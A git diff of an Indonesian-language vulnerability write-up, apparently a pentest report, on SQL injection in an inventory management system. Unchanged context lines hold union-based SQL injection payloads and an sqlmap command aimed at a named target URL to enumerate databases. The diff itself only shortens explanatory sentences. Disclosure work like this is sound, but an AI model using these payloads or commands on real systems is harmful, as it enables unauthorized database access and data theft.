@@ -26,7 +26,7 @@ Sistem Manajemen Inventaris ini ditemukan memiliki celah keamanan kritis pada pa
 ## 🚀 Proof of Concept (PoC)
 
 ### 1. Manual Injection (Union Based)
-Langkah awal dilakukan dengan menambahkan karakter kutip tunggal (`'`) untuk memicu error, kemudian menggunakan `ORDER BY` untuk menentukan jumlah kolom yang ada pada tabel database.
+Langkah awal dilakukan dengan menambahkan karakter kutip tunggal (`'`) untuk memicu error, kemudian menggunakan `ORDER BY` untuk menentukan jumlah kolom.
 
 * **Payload untuk cek kolom:** `' ORDER BY 5-- -`
 * **Payload untuk ekstraksi data:** `' UNION SELECT 1,2,database(),user(),5-- -`
@@ -37,6 +37,5 @@ Langkah awal dilakukan dengan menambahkan karakter kutip tunggal (`'`) untuk mem
 Setelah celah terverifikasi secara manual, dilakukan eksploitasi otomatis menggunakan **SQLMap** untuk efisiensi ekstraksi data secara menyeluruh.
 
 **A. Enumerasi Database:**
-Mencari daftar database yang tersedia di server.
 ```text
 sqlmap -u "[http://target-bengkel.com/detail.php?id=1](http://target-bengkel.com/detail.php?id=1)" --batch --dbs
